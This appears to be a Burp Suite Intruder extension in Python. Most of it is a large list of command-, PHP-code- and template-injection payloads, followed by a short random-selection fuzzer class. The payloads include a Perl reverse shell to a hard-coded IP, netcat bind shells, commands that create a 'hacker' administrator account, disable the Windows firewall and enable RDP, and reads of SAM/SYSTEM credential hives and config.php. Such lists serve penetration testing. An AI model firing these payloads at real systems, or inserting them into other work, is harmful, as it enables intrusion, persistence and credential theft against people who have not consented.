from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList

import random

try_num = 30
payload_list = [
    "`",
    "|| ",
    "| ",
    "; ",
    "'",
    '"',
    "& ",
    "&& ",
    "%0a",
    "%0a%0d",
    "",
    "%0Aid",
    "%0a id %0a",
    "%0Aid%0A",
    "%0a ping -i 30 127.0.0.1 %0a",
    "%0A/usr/bin/id",
    "%0A/usr/bin/id%0A",
    "%20{${phpinfo()}}",
    "%20{${sleep(20)}}",
    "%20{${sleep(3)}}",
    "a|id|",
    "a;id|",
    "a;id;",
    "a;id\n",
    "() { :;}; curl http://127.0.0.1/.testing/shellshock.txt?vuln=12",
    "| curl http://127.0.0.1/.testing/rce.txt",
    "& curl http://127.0.0.1/.testing/rce.txt",
    "; curl http://127.0.0.1/.testing/rce_vuln.txt",
    "&& curl http://127.0.0.1/.testing/rce_vuln.txt",
    "curl http://127.0.0.1/.testing/rce_vuln.txt",
    "$(`curl http://127.0.0.1/.testing/rce_vuln.txt?req=22jjffjbn`)",
    "dir",
    "| dir",
    "; dir",
    "$(`dir`)",
    "& dir",
    "&&dir",
    "&& dir",
    "| dir C:\",
    "; dir C:\",
    "& dir C:\",
    "&& dir C:\",
    "dir C:\",
    "| dir C:\Documents and Settings\*",
    "; dir C:\Documents and Settings\*",
    "& dir C:\Documents and Settings\*",
    "&& dir C:\Documents and Settings\*",
    "dir C:\Documents and Settings\*",
    "| dir C:\Users",
    "; dir C:\Users",
    "& dir C:\Users",
    "&& dir C:\Users",
    "dir C:\Users",
    ";echo%20'<script>alert(1)</script>'",
    "echo '<img src=http://127.0.0.1/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX",
    ";echo '<script>alert(1)</script>'",
    "echo '<script>alert(1)</script>'// XXXXXXXXXXX",
    "echo '<script src=http://127.0.0.1/.testing/xss.js></script>'// XXXXXXXXXXX",
    '| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl',
    '; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl',
    '& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl',
    '&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl',
    'echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl',
    "() { :;}; echo vulnerable 10",
    "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')",
    "eval('ls')",
    "eval('pwd')",
    "eval('pwd');",
    "eval('sleep 5')",
    "eval('sleep 5');",
    "eval('whoami')",
    "eval('whoami');",
    "exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')",
    "exec('ls')",
    "exec('pwd')",
    "exec('pwd');",
    "exec('sleep 5')",
    "exec('sleep 5');",
    "exec('whoami')",
    "exec('whoami');",
    ';{$_GET["cmd"]}',
    "`id`",
    "|id",
    "| id",
    ";id",
    ";id|",
    ";id;",
    "& id",
    "&&id",
    ";id\n",
    "ifconfig",
    "| ifconfig",
    "; ifconfig",
    "& ifconfig",
    "&& ifconfig",
    "/index.html|id|",
    "ipconfig",
    "| ipconfig /all",
    "; ipconfig /all",
    "& ipconfig /all",
    "&& ipconfig /all",
    "ipconfig /all",
    "ls",
    "$(`ls`)",
    "| ls -l /",
    "; ls -l /",
    "& ls -l /",
    "&& ls -l /",
    "ls -l /",
    "| ls -laR /etc",
    "; ls -laR /etc",
    "& ls -laR /etc",
    "&& ls -laR /etc",
    "| ls -laR /var/www",
    "; ls -laR /var/www",
    "& ls -laR /var/www",
    "&& ls -laR /var/www",
    "| ls -l /etc/",
    "; ls -l /etc/",
    "& ls -l /etc/",
    "&& ls -l /etc/",
    "ls -l /etc/",
    "ls -lh /etc/",
    "| ls -l /home/*",
    "; ls -l /home/*",
    "& ls -l /home/*",
    "&& ls -l /home/*",
    "ls -l /home/*",
    "*; ls -lhtR /var/www/",
    "| ls -l /tmp",
    "; ls -l /tmp",
    "& ls -l /tmp",
    "&& ls -l /tmp",
    "ls -l /tmp",
    "| ls -l /var/www/*",
    "; ls -l /var/www/*",
    "& ls -l /var/www/*",
    "&& ls -l /var/www/*",
    "ls -l /var/www/*",
    "\n",
    "\n\033[2curl http://127.0.0.1/.testing/term_escape.txt?vuln=1?user=\`whoami\`",
    "\n\033[2wget http://127.0.0.1/.testing/term_escape.txt?vuln=2?user=\`whoami\`",
    "\n/bin/ls -al\n",
    "| nc -lvvp 4444 -e /bin/sh|",
    "; nc -lvvp 4444 -e /bin/sh;",
    "& nc -lvvp 4444 -e /bin/sh&",
    "&& nc -lvvp 4444 -e /bin/sh &",
    "nc -lvvp 4444 -e /bin/sh",
    "nc -lvvp 4445 -e /bin/sh &",
    "nc -lvvp 4446 -e /bin/sh|",
    "nc -lvvp 4447 -e /bin/sh;",
    "nc -lvvp 4448 -e /bin/sh&",
    "\necho INJECTX\nexit\n\033[2Acurl http://127.0.0.1/.testing/rce_vuln.txt\n",
    "\necho INJECTX\nexit\n\033[2Asleep 5\n",
    "\necho INJECTX\nexit\n\033[2Awget http://127.0.0.1/.testing/rce_vuln.txt\n",
    "| net localgroup Administrators hacker /ADD",
    "; net localgroup Administrators hacker /ADD",
    "& net localgroup Administrators hacker /ADD",
    "&& net localgroup Administrators hacker /ADD",
    "net localgroup Administrators hacker /ADD",
    "| netsh firewall set opmode disable",
    "; netsh firewall set opmode disable",
    "& netsh firewall set opmode disable",
    "&& netsh firewall set opmode disable",
    "netsh firewall set opmode disable",
    "netstat",
    ";netstat -a;",
    "| netstat -an",
    "; netstat -an",
    "& netstat -an",
    "&& netstat -an",
    "netstat -an",
    "| net user hacker Password1 /ADD",
    "; net user hacker Password1 /ADD",
    "& net user hacker Password1 /ADD",
    "&& net user hacker Password1 /ADD",
    "net user hacker Password1 /ADD",
    "| net view",
    "; net view",
    "& net view",
    "&& net view",
    "net view",
    "\nid|",
    "\nid;",
    "\nid\n",
    "\n/usr/bin/id\n",
    "|| phpinfo()",
    "| phpinfo()",
    " {${phpinfo()}}",
    ";phpinfo()",
    ";phpinfo();//",
    "';phpinfo();//",
    "{${phpinfo()}}",
    "& phpinfo()",
    "&& phpinfo()",
    "phpinfo()",
    "phpinfo();",
    '<?php system("curl http://127.0.0.1/.testing/rce_vuln.txt?method=phpsystem_get");?>',
    '<?php system("curl http://127.0.0.1/.testing/rce_vuln.txt?req=df2fkjj");?>',
    '<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>',
    '<?php system("sleep 10");?>',
    '<?php system("sleep 5");?>',
    '<?php system("wget http://127.0.0.1/.testing/rce_vuln.txt?method=phpsystem_get");?>',
    '<?php system("wget http://127.0.0.1/.testing/rce_vuln.txt?req=jdfj2jc");?>',
    ":phpversion();",
    "`ping 127.0.0.1`",
    "& ping -i 30 127.0.0.1 &",
    "& ping -n 30 127.0.0.1 &",
    ";${@print(md5(RCEVulnerable))};",
    '${@print("RCEVulnerable")}',
    "${@print(system($_SERVER['HTTP_USER_AGENT']))}",
    "pwd",
    "| pwd",
    "; pwd",
    "& pwd",
    "&& pwd",
    "\r",
    '| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
    '; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
    '& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
    '&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
    'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
    "\r\n",
    "route",
    "| sleep 1",
    "; sleep 1",
    "& sleep 1",
    "&& sleep 1",
    "sleep 1",
    "|| sleep 10",
    "| sleep 10",
    "; sleep 10",
    "{${sleep(10)}}",
    "& sleep 10 ",
    "&& sleep 10",
    "sleep 10",
    "|| sleep 15",
    "| sleep 15",
    "; sleep 15",
    "& sleep 15 ",
    "&& sleep 15",
    " {${sleep(20)}}",
    "{${sleep(20)}}",
    " {${sleep(3)}}",
    "{${sleep(3)}}",
    "| sleep 5",
    "; sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "sleep 5",
    " {${sleep(hexdec(dechex(20)))}} ",
    "{${sleep(hexdec(dechex(20)))}} ",
    "sysinfo",
    "| sysinfo",
    "; sysinfo",
    "& sysinfo",
    "&& sysinfo",
    "system('cat C:\boot.ini');",
    "system('cat config.php');",
    "|| system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "| system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "; system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "& system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "&& system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "system('curl http://127.0.0.1/.testing/rce_vuln.txt')",
    "system('curl http://127.0.0.1/.testing/rce_vuln.txt?req=22fd2wdf')",
    "system('curl http://127.0.0.1/.testing/rce_vuln.txt');",
    "system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')",
    "systeminfo",
    "| systeminfo",
    "; systeminfo",
    "& systeminfo",
    "&& systeminfo",
    "system('ls')",
    "system('pwd')",
    "system('pwd');",
    "|| system('sleep 5');",
    "| system('sleep 5');",
    "; system('sleep 5');",
    "& system('sleep 5');",
    "&& system('sleep 5');",
    "system('sleep 5')",
    "system('sleep 5');",
    "system('wget http://127.0.0.1/.testing/rce_vuln.txt?req=22fd2w23')",
    "system('wget http://127.0.0.1/.testing/rce_vuln.txt');",
    "system('whoami')",
    "system('whoami');",
    "test*; ls -lhtR /var/www/",
    "$(`type C:\boot.ini`)",
    "&&type C:\\boot.ini",
    "| type C:\Windows\repair\SAM",
    "; type C:\Windows\repair\SAM",
    "& type C:\Windows\repair\SAM",
    "&& type C:\Windows\repair\SAM",
    "type C:\Windows\repair\SAM",
    "| type C:\Windows\repair\SYSTEM",
    "; type C:\Windows\repair\SYSTEM",
    "& type C:\Windows\repair\SYSTEM",
    "&& type C:\Windows\repair\SYSTEM",
    "type C:\Windows\repair\SYSTEM",
    "| type C:\WINNT\repair\SAM",
    "; type C:\WINNT\repair\SAM",
    "& type C:\WINNT\repair\SAM",
    "&& type C:\WINNT\repair\SAM",
    "type C:\WINNT\repair\SAM",
    "type C:\WINNT\repair\SYSTEM",
    "| type %SYSTEMROOT%\repair\SAM",
    "; type %SYSTEMROOT%\repair\SAM",
    "& type %SYSTEMROOT%\repair\SAM",
    "&& type %SYSTEMROOT%\repair\SAM",
    "type %SYSTEMROOT%\repair\SAM",
    "| type %SYSTEMROOT%\repair\SYSTEM",
    "; type %SYSTEMROOT%\repair\SYSTEM",
    "& type %SYSTEMROOT%\repair\SYSTEM",
    "&& type %SYSTEMROOT%\repair\SYSTEM",
    "type %SYSTEMROOT%\repair\SYSTEM",
    "uname",
    ";uname;",
    "| uname -a",
    "; uname -a",
    "& uname -a",
    "&& uname -a",
    "uname -a",
    "|/usr/bin/id",
    ";|/usr/bin/id|",
    ";/usr/bin/id|",
    "$;/usr/bin/id",
    "() { :;}; wget http://127.0.0.1/.testing/shellshock.txt?vuln=11",
    "| wget http://127.0.0.1/.testing/rce.txt",
    "& wget http://127.0.0.1/.testing/rce.txt",
    "; wget http://127.0.0.1/.testing/rce_vuln.txt",
    "$(`wget http://127.0.0.1/.testing/rce_vuln.txt`)",
    "&& wget http://127.0.0.1/.testing/rce_vuln.txt",
    "wget http://127.0.0.1/.testing/rce_vuln.txt",
    "$(`wget http://127.0.0.1/.testing/rce_vuln.txt?req=22jjffjbn`)",
    "which curl",
    "which gcc",
    "which nc",
    "which netcat",
    "which perl",
    "which python",
    "which wget",
    "whoami",
    "| whoami",
    "; whoami",
    "' whoami",
    "' || whoami",
    "' & whoami",
    "' && whoami",
    "'; whoami",
    '" whoami',
    '" || whoami',
    '" | whoami',
    '" & whoami',
    '" && whoami',
    '"; whoami',
    "$(`whoami`)",
    "& whoami",
    "&& whoami",
    '{{ get_user_file("C:\boot.ini") }}',
    '{{ get_user_file("/etc/hosts") }}',
    "{{4+4}}",
    "{{4+8}}",
    "{{person.secret}}",
    "{{person.name}}",
    "{1} + {1}",
    "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",
    "{{[] .__ Class __.__ base __.__ subclasses __ ()}}",
]

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
    
    def getGeneratorName(self):
        return "Windows cmd Injection Payload Generator"

    def createNewInstance(self, attack):
        return BurpFuzzer(self, attack)


class BurpFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = try_num
        self.num_iterations = 0
        self.num_tried = list()

        return
    
    def hasMorePayloads(self):
        if (self.num_iterations == self.max_payloads) or (len(self.num_tried) == len(payload_list)):
            return False
        else:
            return True
    
    def getNextPayload(self, current_payload):
        payload = ''.join(chr(x) for x in current_payload)

        payload = self.mutate_payload(payload)

        self.num_iterations += 1

        return payload
    
    def reset(self):
        self.num_iterations = 0
        return
    
    def mutate_payload(self, original_payload):        
        
        while True:
            sample_number = random.randint(0, len(payload_list) -1)
            if sample_number not in self.num_tried:
                    self.num_tried.append(sample_number)
                    break

        return payload_list[sample_number]